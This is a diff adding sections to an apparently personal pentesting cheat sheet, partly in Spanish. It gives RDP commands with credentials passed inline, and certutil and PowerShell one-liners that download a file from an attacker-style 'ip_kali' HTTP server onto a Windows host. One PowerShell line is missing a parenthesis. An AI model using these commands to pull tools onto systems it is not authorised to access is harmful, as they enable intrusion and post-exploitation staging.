@@ -154,3 +154,27 @@ git config --global user.email "[email address]"
 git config --global color.ui auto
 
 ```
+
+### Remote Desktop to windows from linux
+```
+# Using xfreerdp
+ xfreerdp /u:'domain\user' /p:'Password' /v:host_ip:3389 (or another port if 3389 is not the case)
+
+# Using rdekstop
+rdesktop ip_address -k es -u user -p pass -d domain
+```
+
+### Transfer files to windows
+
+```
+# Con certutil
+certutil.exe -f -urlcache -split http://ip_kali:8000/fichero fichero
+
+# Con powershell
+# En la máquina kali)
+python -m http.server
+
+# En windows     
+new-object net.webclient).DownloadFile('http://ip_kali:8000/fichero', 'fichero')      # Opción 1
+powershell Invoke-WebRequest "http://ip_kali:8000/fichero" -OutFile "fichero"         # Opción 2
+
